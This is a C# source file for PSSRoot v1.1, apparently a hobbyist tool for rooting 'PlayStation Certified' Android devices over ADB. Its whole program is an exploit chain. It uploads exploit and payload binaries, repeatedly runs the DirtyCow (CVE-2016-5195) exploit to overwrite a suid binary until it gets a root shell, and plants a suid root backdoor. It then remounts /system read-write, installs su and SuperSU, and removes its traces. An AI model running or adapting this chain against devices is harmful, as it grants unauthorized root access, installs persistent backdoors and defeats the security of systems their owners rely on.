using PSSRoot.Resources;
using System.IO.Compression;

namespace PSSRoot
{
    public class Program
    {

        static void uploadExploitFiles(AdbHelper adb)
        {
            Log.Task("Uploading required files ...");

            adb.UploadExecutable(RootResources.exploit, Constants.ANDROID_EXPLOIT);
            adb.UploadExecutable(RootResources.payload, Constants.ANDROID_PAYLOAD);
            adb.UploadExecutable(RootResources.su, Constants.ANDROID_SU_BINARY);
        }

        static void installTempoaryRootBackdoor(CmdHelper cmd)
        {
            
            Log.Task("Creating temporary root backdoor ...");

            cmd.CopyFile(Constants.ANDROID_PAYLOAD, Constants.ANDROID_ROOT_BACKDOOR);
            cmd.RootChown(Constants.ANDROID_ROOT_BACKDOOR, Constants.ANDROID_UID_ROOT, Constants.ANDROID_UID_ROOT);
            cmd.RootChmod(Constants.ANDROID_ROOT_BACKDOOR, Constants.ANDROID_MODE_SUID);

        }

        static void backupSuidBinary(CmdHelper cmd)
        {

            Log.Task("Backing up "+Constants.ANDROID_SUID_BINARY+" ...");
            if (!cmd.FileExists(Constants.ANDROID_SUID_BACKUP))
                cmd.CopyFile(Constants.ANDROID_SUID_BINARY, Constants.ANDROID_SUID_BACKUP);
            else
                Log.Warn("Backup already exists...");
        }

        static void runExploitToOverwriteSuidBinary(CmdHelper cmd)
        {
            bool gotRoot = false;

            int i = 1;
            do
            {
                Log.Task("Run exploit attempt #" + i.ToString() + " (this may take a bit) ...");

                // DirtyCow or CVE-2016-5195 allows you to overwrite any file, so we overwrite a suid binary.
                cmd.RunExploit(Constants.ANDROID_PAYLOAD, Constants.ANDROID_SUID_BINARY);

                // Attempt to run the suid binary and see if we got root.
                gotRoot = cmd.EnterRootEnvironment(Constants.ANDROID_SUID_BINARY);

                i++;
            }
            while (!gotRoot); // retry until get root shell (sometimes what it writes is corrupted.)
        }

        static void switchFromSuidToRootBackdoor(CmdHelper cmd)
        {
            Log.Task("Switching from " + Constants.ANDROID_SUID_BINARY + " to " + Constants.ANDROID_ROOT_BACKDOOR + " ...");

            // exit current root environment ...
            cmd.ExitRootEnvironment();

            // enter root backdoor ...
            if (!cmd.EnterRootEnvironment(Constants.ANDROID_ROOT_BACKDOOR)) throw new Exception("unable to enter root backdoor.");

        }

        static void restoreOriginalSuidBinary(CmdHelper cmd)
        {
            Log.Task("Restoring the original " + Constants.ANDROID_SUID_BINARY + " file ...");
            cmd.RootCatOverwriteFile(Constants.ANDROID_SUID_BACKUP, Constants.ANDROID_SUID_BINARY);
        }

        static void installSuBinary(AdbHelper adb, CmdHelper cmd)
        {
            
            Log.Task("Installing SU binary ...");

            cmd.CopyFile(Constants.ANDROID_SU_BINARY, Constants.ANDROID_SU_INSTALL);

            cmd.RootChown(Constants.ANDROID_SU_INSTALL, Constants.ANDROID_UID_ROOT, Constants.ANDROID_UID_ROOT);
            cmd.RootChmod(Constants.ANDROID_SU_INSTALL, Constants.ANDROID_MODE_SUID);

            cmd.RootSuInstall();
            cmd.RootSuDaemon();

            Log.Task("Installing SuperSU.apk ...");
            adb.InstallApk(RootResources.supersu);


        }

        static void cleanup(CmdHelper cmd)
        {            
            Log.Task("Cleaning up temporary files ...");

            cmd.RemoveFile(Constants.ANDROID_ROOT_BACKDOOR);
            cmd.RemoveFile(Constants.ANDROID_SU_BINARY);
            cmd.RemoveFile(Constants.ANDROID_EXPLOIT);
            cmd.RemoveFile(Constants.ANDROID_PAYLOAD);
            cmd.RemoveFile(Constants.ANDROID_SUID_BACKUP);

        }
        static void Main(string[] args)
        {
            Log.Info("PSSRoot v1.1 by LiEnby ...");
            Log.Info("Root exploit for PlayStation Certified Devices!");

            try
            {

                using (AdbHelper adb = new AdbHelper())
                {
                    using (CmdHelper cmd = new CmdHelper(adb, RootResources.busybox))
                    {

                        // upload required files to device
                        uploadExploitFiles(adb);

                        // backup suid binaries ...
                        backupSuidBinary(cmd);

                        // get root shell via overwrtiing suid binary
                        runExploitToOverwriteSuidBinary(cmd);

                        // mount /system as read-write
                        cmd.RootRemountRw(Constants.ANDROID_SYSTEM_DIR);

                        // install temporary root backdoor ...
                        installTempoaryRootBackdoor(cmd);

                        // switch from 'run-as' overwritten by exploit, to root backdoor ..
                        switchFromSuidToRootBackdoor(cmd);

                        // cleanup: restore original suid binary... 
                        restoreOriginalSuidBinary(cmd);

                        // install the 'su' binary file ...
                        installSuBinary(adb, cmd);

                        // cleanup any files related to the exploitation process.
                        cleanup(cmd);

                        // remount /system as read-only ..
                        cmd.RootRemountRo(Constants.ANDROID_SYSTEM_DIR);
                    }
                }

                Log.Info("Done, launch SuperSU and click the \"normal\" option when prompted to update");
                Log.Info("Press any key to exit ...");
                Console.ReadKey();
            }
            catch (Exception e)
            {
                Log.Error(e.Message);
                Log.Info("Press any key to exit ...");
                Console.ReadKey();
            }


        }
    }
}
